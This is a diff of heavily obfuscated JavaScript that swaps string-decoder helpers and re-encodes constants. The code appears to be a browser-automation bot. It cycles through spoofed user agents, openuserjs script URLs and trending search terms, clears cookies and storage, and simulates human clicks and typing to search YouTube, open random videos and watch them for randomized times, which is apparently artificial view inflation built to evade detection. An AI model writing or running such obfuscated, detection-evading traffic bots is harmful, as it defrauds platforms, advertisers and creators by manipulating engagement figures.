+      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
       'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
       'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
       'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
       'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
       'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
       'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
-      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
+      'https://op' + 'enuserjs.o' + 'rg/scripts' + a4(0x13, '[Y74') + 'Wide_GitHu' + 'b',
       'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
       'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
       'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
-      a5(0x13) + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
-      'https://op' + 'enuserjs.o' + a5(0x4) + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
+      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
+      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
     ],
     'oujsUAs': [
       'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
@@ -381,53 +473,13 @@ const flags = {
     ],
     'searchTerms': []
   };
-data['searchTerm' + 's']['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), data['searchTerm' + 's']['push'](('mrbeast,mr' + a5(0x11) + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), data['searchTerm' + 's']['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), data['searchTerm' + 's']['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0xe89 + -0x2052 + 0x11d3 * 0x1)), data['searchTerm' + 's']['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0x607 + 0x512 * 0x3 + -0x1533)), data['searchTerm' + 's']['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), data['searchTerm' + 's'] = data['searchTerm' + 's']['flat'](-0x1 * -0x1f3 + 0x246 + -0x1 * 0x436);
-
-function d(b, c) {
-  const e = a();
-  return d = function(f, g) {
-    f = f - (0x1 * -0x1cc7 + 0x74f * 0x5 + -0x1f1 * 0x4);
-    let h = e[f];
-    return h;
-  }, d(b, c);
-}
-
-function a() {
-  const bm = [
-    'CMCVzw4VC2nYAq',
-    'control',
-    'W7dcUCoeWPC3W6e',
-    'buffer',
-    'CMCVC2nYAxb0CW',
-    'W6GVnSklWP8bW5ldMwVdOW',
-    'e/youtube.',
-    'CK5Rwf9bngTcqq',
-    'undcloud.c',
-    '_Katana_+_',
-    'l2f5y2fIDgeVva',
-    'tMOTm0TdnMTUsa',
-    'W7X/mJVdS8ouz8o0pCkB',
-    'ienOCM9Tzs8Xma',
-    'WPj3W5RdQxpdU8k7W7/cTN0',
-    'CNqA6IYj17',
-    'dium.com/@',
-    'igjLyxn0lg1YyG',
-    'WOzXFMxcK8kCvdjiCa',
-    'Ahr0Chm6lY9VCa',
-    'WPyDbmkrWR3dTHhdRmo1W7u',
-    'BM8Ty2fJAgu'
-  ];
-  a = function() {
-    return bm;
-  };
-  return a();
-}
+data['searchTerm' + 's']['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), data['searchTerm' + 's']['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), data['searchTerm' + 's']['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), data['searchTerm' + 's']['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0xc31 * -0x2 + 0xb * -0x271 + 0x283)), data['searchTerm' + 's']['push'](['moomoo.io\x20' + a4(0xc, 'SoYK')]['repeatExte' + 'nd'](-0x2683 + 0x2e9 + 0x23a4)), data['searchTerm' + 's']['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), data['searchTerm' + 's'] = data['searchTerm' + 's']['flat'](-0xb97 + 0x1c87 + -0x10ed);
 const HookManager = {
   'prototypes': () => {
     Array['prototype']['repeatExte' + 'nd'] = function(g) {
       let h = this,
         i = h;
-      for (let j = 0x266a + -0x12ad + 0x13bd * -0x1; j < g; j++)
+      for (let j = 0x1d7 * 0xf + 0x23b9 + -0x1 * 0x3f52; j < g; j++)
         i = i['concat'](h);
       return i;
     }, Array['prototype']['random'] = function() {
@@ -435,69 +487,24 @@ const HookManager = {
     };
     const f = new Map();
     Array['prototype']['randomFlus' + 'h'] = function(g) {
+      const a6 = b;
       let h = this[floor(random() * this['length'])];
       f['has'](g) || f['set'](g, new Set());
       const i = f['get'](g);
-      for (; i['has'](h);)
+      for (; i[a6(0x1, 'uRMs')](h);)
         i['size'] === this['length'] && i['clear'](), h = this[floor(random() * this['length'])];
       return i['add'](h), h;
     };
   }
 };
-
-function b(c, d) {
-  const e = a();
-  return b = function(f, g) {
-    f = f - (0x1 * -0x1cc7 + 0x74f * 0x5 + -0x1f1 * 0x4);
-    let h = e[f];
-    if (b['qGxyUJ'] === undefined) {
-      var i = function(n) {
-        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
-        let p = '',
-          q = '';
-        for (let r = 0x1 * 0x637 + -0x1194 + -0xb5d * -0x1, s, t, u = 0x9 * 0xbf + -0x145d + 0xda6; t = n['charAt'](u++); ~t && (s = r % (0x1 * 0x15a + -0x8f9 * -0x1 + 0xa4f * -0x1) ? s * (-0x298 * -0x2 + -0x1ed4 + 0x19e4) + t : t, r++ % (-0x1dd6 + -0x18d * 0x12 + 0x39c4 * 0x1)) ? p += String['fromCharCode'](0x639 + 0xd37 * 0x2 + 0x1fa8 * -0x1 & s >> (-(-0x26b8 + 0xfdb + -0x1 * -0x16df) * r & -0xa9 * -0x31 + 0x5 * -0x48d + -0x32 * 0x31)) : -0x27 * 0xe5 + 0x1410 + 0xed3) {
-          t = o['indexOf'](t);
-        }
-        for (let v = -0x3ed * -0x3 + -0x8f5 * 0x3 + 0xc * 0x142, w = p['length']; v < w; v++) {
-          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0xb7e * -0x3 + 0x1305 * -0x2 + 0x2 * 0x244a))['slice'](-(-0x2063 * -0x1 + 0x1197 + -0x31f8));
-        }
-        return decodeURIComponent(q);
-      };
-      const m = function(n, o) {
-        let p = [],
-          q = 0x4 * 0x3f5 + 0x24bc + 0x1a48 * -0x2,
-          r, t = '';
-        n = i(n);
-        let u;
-        for (u = 0x1 * -0x101 + 0x1f3 + -0xf2; u < -0x10 * -0x24b + -0x1b4 + -0x21fc; u++) {
-          p[u] = u;
-        }
-        for (u = -0x17ff * -0x1 + 0xbe5 * 0x3 + 0x3bae * -0x1; u < -0x5e * -0x2b + 0x165e + -0x2528; u++) {
-          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x1be1 + 0x22e8 + -0x3dc9 * 0x1), r = p[u], p[u] = p[q], p[q] = r;
-        }
-        u = -0x1 * 0x5e1 + -0x14e8 * 0x1 + 0x1ac9, q = 0x77 * 0x5 + 0x513 + 0x766 * -0x1;
-        for (let v = -0x15d * 0x6 + -0x1 * 0x544 + 0x2 * 0x6b9; v < n['length']; v++) {
-          u = (u + (0x1b1b + -0x210 * 0xe + -0x1c6 * -0x1)) % (0x29f * 0x5 + 0x2 * -0xd57 + 0xe93), q = (q + p[u]) % (0xdc5 + 0x75 + -0xd3a * 0x1), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x950 + -0x9 * 0x1a1 + -0x1 * -0x659)]);
-        }
-        return t;
-      };
-      b['LqwIjs'] = m, c = arguments, b['qGxyUJ'] = !![];
-    }
-    const j = e[0x1 * 0x2272 + -0x13c8 + -0xeaa],
-      k = f + j,
-      l = c[k];
-    return !l ? (b['TnMagF'] === undefined && (b['TnMagF'] = !![]), h = b['LqwIjs'](h, g), c[k] = h) : h = l, h;
-  }, b(c, d);
-}
 HookManager['prototypes']();
 const actions = [
   [
     () => flags['ActivateBr' + 'owser'],
     async () => {
-      const a8 = c,
-        a7 = b,
-        a6 = d;
-      async function f(z = '', A = 0x142c * 0x1 + 0x3aa * -0x7 + 0x3d * 0x17, B) {
+      const aa = c,
+        a9 = b;
+      async function f(z = '', A = -0x4 * 0x3b4 + 0x1b * -0x109 + 0x2ac4, B) {
         const C = await B['waitForSel' + 'ector'](z);
         return await v['simClickEl' + 'ement'](C, {
           'pauseAfterMouseUp': A
@@ -509,27 +516,27 @@ const actions = [
           await z['deleteCook' + 'ie'](B);
         return await z['evaluate'](() => {
           window['name'] = '', localStorage['clear'](), sessionStorage['clear']();
-        }), 0x1b40 + -0x1a36 + 0x109 * -0x1;
+        }), -0x226c + -0x1720 + -0x398d * -0x1;
       }
       async function h(z) {
         let A = await u['newPage']();
-        return await A['setDefault' + 'Navigation' + 'Timeout'](-0xbf * 0x28 + -0x187d + 0x3655), await A['goto'](z, {
+        return await A['setDefault' + 'Navigation' + 'Timeout'](0x89 * 0x43 + -0x1977 + -0xe * 0xbe), await A['goto'](z, {
           'timeout': 0x0
         }), A;
       }
       async function i(z) {
-        return await wait(-0x1368 * -0x1 + -0x384 + 0x1 * 0x3a4), await z['waitForNet' + 'workIdle']({
+        return await wait(0x1848 + -0x2551 + -0x7 * -0x4a7), await z['waitForNet' + 'workIdle']({
           'idleTime': 0x1d4c,
           'timeout': 0x0
-        }), 0x14e3 + 0x2033 * 0x1 + -0x3515;
+        }), -0x2 * -0x11ef + -0x347 * -0x9 + -0x415c;
       }
       async function j(z) {
         log('watching..' + '.'), await z['evaluate'](() => {
           var B;
-          (B = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](-0x544 + -0x1 * -0x249 + 0x7 * 0x6d, 0x1b1b + -0x210 * 0xe + -0x1cc * -0x1), B[Math['floor'](Math['random']() * B['length'])])['setAttribu' + 'te']('id', '__scope');
-        }), await f('#__scope', 0x29f * 0x5 + 0x2 * -0xd57 + 0xd93, z), await i(z);
+          (B = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x1b97 + 0xc7a + -0x107 * 0x27, -0x8a5 * 0x2 + 0x1 * -0x1817 + 0x2968), B[Math['floor'](Math['random']() * B['length'])])['setAttribu' + 'te']('id', '__scope');
+        }), await f('#__scope', 0x12a3 * 0x2 + 0x14ee + -0x3a34, z), await i(z);
         const A = await k(z);
-        return await wait(min((0xa537 + 0x57a + -0x919 * -0x7) * getRandomInt(0x950 + -0x9 * 0x1a1 + -0x1 * -0x55b, 0x1 * 0x2272 + -0x13c8 + -0xea5), A)), -0xe08 + -0x1 * -0x1a39 + -0xc30;
+        return await wait(min((0x2 * -0x7556 + 0x1b7a6 + 0x1d66) * getRandomInt(-0x1 * 0x1b54 + 0xca6 * -0x1 + 0x27fc, 0x2 * -0x15b + 0x1 * 0x1bd3 + -0x1918), A)), 0x1c96 + 0x1 * -0x2128 + 0x493;
       }
       async function k(z) {
         return await z['evaluate'](() => {
@@ -542,36 +549,38 @@ const actions = [
             'Hour': 0x36ee80
           };
           let B = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
-            C = 0x212a + 0x6 * 0xdb + -0x264c;
-          B = B['split'](B['includes']('of') ? '\x20of\x20' : ',\x20')[-0x4 * -0x125 + 0x183 * -0xd + 0xf14]['split']('\x20');
-          for (let D = -0xc2b * -0x2 + -0xb73 + -0xce3; D < B['length']; D += -0x197c + -0x1223 + 0x2ba1)
-            C += B[D] * A[B[D + (0x54d + -0x1 * -0x15d3 + -0x1b1f)]];
+            C = 0x7a5 + -0x1d17 * -0x1 + -0x24bc;
+          B = B['split'](B['includes']('of') ? '\x20of\x20' : ',\x20')[0x137b * -0x2 + 0x1a9f + 0x9e * 0x14]['split']('\x20');
+          for (let D = 0x469 * -0x1 + 0x19ad + -0x1544; D < B['length']; D += -0xc66 * -0x1 + 0x2673 + -0x5f * 0x89)
+            C += B[D] * A[B[D + (-0xc31 + 0x2 * -0x102e + -0x2c8e * -0x1)]];
           return C;
         });
       }
       async function l(z) {
         log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await z['goto'](channels['random'](), {
           'timeout': 0x0
-        }), await f('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)', -0x3 * -0x2f6 + -0x1d3 * -0xf + -0x1 * 0x243f, z), log('clicked\x20vi' + 'deo\x20stuff'), await i(z), log('page\x20netwo' + 'rk\x20idle\x20x2'), await z['evaluate'](() => {
-          const C = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](E => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == E['getAttribu' + 'te']('class'))['slice'](0x19c8 + -0x326 * -0x2 + -0x200e)['map'](E => Array['from'](E['children']))['flat'](-0x818 + 0x867 + 0x1 * -0x4e)['map'](E => E['childNodes'][-0x1aee + 0xff0 + 0x233 * 0x5]['childNodes'][-0x9d * 0x25 + 0x1 * -0x14dd + 0x2b8e]['childNodes'][-0x1c78 + -0xe2 * -0x5 + 0x180f]['childNodes'][0x1529 + -0x1e81 + 0x958]['childNodes'][-0x3 * 0x40b + -0x1bfd + -0x281f * -0x1]);
+        }), await f('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)', 0x35 * 0x5f + 0x134f + -0x26fa, z), log('clicked\x20vi' + 'deo\x20stuff'), await i(z), log('page\x20netwo' + 'rk\x20idle\x20x2'), await z['evaluate'](() => {
+          const a8 = b,
+            a7 = d,
+            C = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](E => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == E['getAttribu' + 'te']('class'))['slice'](-0x811 + -0x21 + 0x838)[a7(0x4)](E => Array['from'](E['children']))['flat'](0x1bb4 + -0x4 * 0x175 + -0x15df * 0x1)['map'](E => E['childNodes'][-0x126b + -0x131 + 0x139d]['childNodes'][0x1c03 + 0x1ffd + -0x3c00]['childNodes'][-0x1f38 + -0x11 * -0x211 + -0x3e8]['childNodes'][-0x618 + 0x3 * 0xb1b + -0x1b39]['childNodes'][0xf73 * -0x1 + 0x74 * -0x47 + 0x5f4 * 0x8]);
           var D;
-          return (D = C)[Math['floor'](Math['random']() * D['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), C['map'](E => E['href']);
-        }), await wait(getRandomInt(0x1 * 0x24ac + 0x1c71 + 0x3 * -0x1467, 0x67 + -0x8c9 * -0x3 + 0xa * -0xb9)), await f('#__hookedV' + 'idToWatch', -0x157c + -0xef2 + -0xc25 * -0x3, z), log('woah\x20click' + 'ed\x20some\x20vi' + 'deoo'), await wait(0x3e3 * 0xd + -0x14c0 + 0x1cd1);
+          return (D = C)[Math['floor'](Math['random']() * D['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), C[a8(0x6, '9RtC')](E => E['href']);
+        }), await wait(getRandomInt(-0xe7a * -0x2 + -0x374 * -0x4 + 0x26dc * -0x1, -0x98 * -0x1 + -0x1e29 + 0x3119)), await f('#__hookedV' + 'idToWatch', -0x2 * 0x1233 + -0x1 * 0x1f1b + 0x4382, z), log('woah\x20click' + 'ed\x20some\x20vi' + 'deoo'), await wait(0x6629 + -0x19ed * 0x1 + -0x11a4);
         const A = await k(z),
-          B = min((0x6 * 0x687 + 0xdf * -0x7d + 0x13019) * getRandomInt(0x1 * -0x7c3 + 0x6a6 + 0x11f, -0xecd + 0x19 * -0xaa + 0x1f6c), A);
-        return log('Watching\x20v' + 'id\x20for\x20' + B + ('ms,\x20max\x20ti' + 'me:\x20') + A + 'ms'), await wait(B), -0x1 * -0x1dd6 + 0x2578 + 0x434d * -0x1;
+          B = min((-0x1 * 0x1c37f + 0x544 * -0x3f + 0x4e47 * 0xd) * getRandomInt(0xca3 + 0x176 * -0x2 + -0x9b5, 0x26f4 + -0x22e7 + -0x408), A);
+        return log('Watching\x20v' + 'id\x20for\x20' + B + ('ms,\x20max\x20ti' + 'me:\x20') + A + 'ms'), await wait(B), 0x17e * -0x1a + 0x81f + 0x1eae;
       }
       async function m(z) {
         return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await z['waitForSel' + 'ector']('.style-sco' + 'pe\x20ytd-ric' + 'h-grid-row'), await z['evaluate'](() => {
           var A;
-          (A = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](B => 'contents' != B['id']), A[Math['floor'](Math['random']() * A['length'])])['children'][0xf68 + -0x13 * -0x17b + 0x2e7 * -0xf]['children'][0x1e90 + 0x8d8 + -0x2768]['children'][0x2 * -0x77d + -0x22af + -0x31a9 * -0x1]['children'][-0x959 + 0x5dc + -0x2f * -0x13]['children'][0x1 * -0x2161 + 0x121e * 0x1 + 0xf43]['setAttribu' + 'te']('id', 'gottemezez');
-        }), await f('#gottemeze' + 'z', -0x1bba + -0x175d * -0x1 + 0x45e, z), await i(z), await j(z), 0x3 * -0xc11 + -0x1c7a * 0x1 + 0x40ae;
+          (A = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](B => 'contents' != B['id']), A[Math['floor'](Math['random']() * A['length'])])['children'][-0x55f * -0x2 + -0x55d * -0x4 + -0x2032]['children'][-0x3 * -0x5ba + 0x1 * -0xa99 + 0x695 * -0x1]['children'][-0x1b09 + 0xe5d + 0xcac * 0x1]['children'][0xe02 + -0x1 * 0x22e7 + 0x3 * 0x6f7]['children'][-0x2 * 0x679 + -0x787 + 0x6d3 * 0x3]['setAttribu' + 'te']('id', 'gottemezez');
+        }), await f('#gottemeze' + 'z', 0xc1a + 0x2478 + -0x3091, z), await i(z), await j(z), -0x1e02 * 0x1 + 0x21 * 0x126 + 0x3 * -0x2a1;
       }
       async function n(z) {
         log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await z['evaluate'](() => {
           let C = Array['from'](document['querySelec' + 'torAll']('#search'));
           document['getElement' + 'ById']('__searchBo' + 'xReal') || C['find'](D => 'INPUT' === D['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
-        }), await f('#__searchB' + 'oxReal', -0x198a * 0x1 + -0xe4b + 0x39f * 0xb, z), await v['simKeyboar' + 'dType'](searchTerms['random']() + ''), await f('#search-ic' + 'on-legacy', 0x1 * -0x17a3 + 0x18c * 0x19 + -0x503 * 0x3, z), log('searching.' + '..'), await z['waitForFun' + 'ction']('Array.from' + '(document.' + 'getElement' + 'sByTagName' + '(\x22ytd-vide' + 'o-renderer' + '\x22)).length'), await i(z);
+        }), await f('#__searchB' + 'oxReal', -0x2c7 * -0x6 + 0x518 + -0xa * 0x22d, z), await v['simKeyboar' + 'dType'](searchTerms['random']() + ''), await f('#search-ic' + 'on-legacy', -0x7 * -0x52 + 0x19a * 0x11 + -0x1d78, z), log('searching.' + '..'), await z['waitForFun' + 'ction']('Array.from' + '(document.' + 'getElement' + 'sByTagName' + '(\x22ytd-vide' + 'o-renderer' + '\x22)).length'), await i(z);
         let A = await z['evaluate'](() => {
           const C = {
               'seconds': 0x3e8,
@@ -581,41 +590,41 @@ const actions = [
               'minute': 0xea60,
               'hour': 0x36ee80
             },
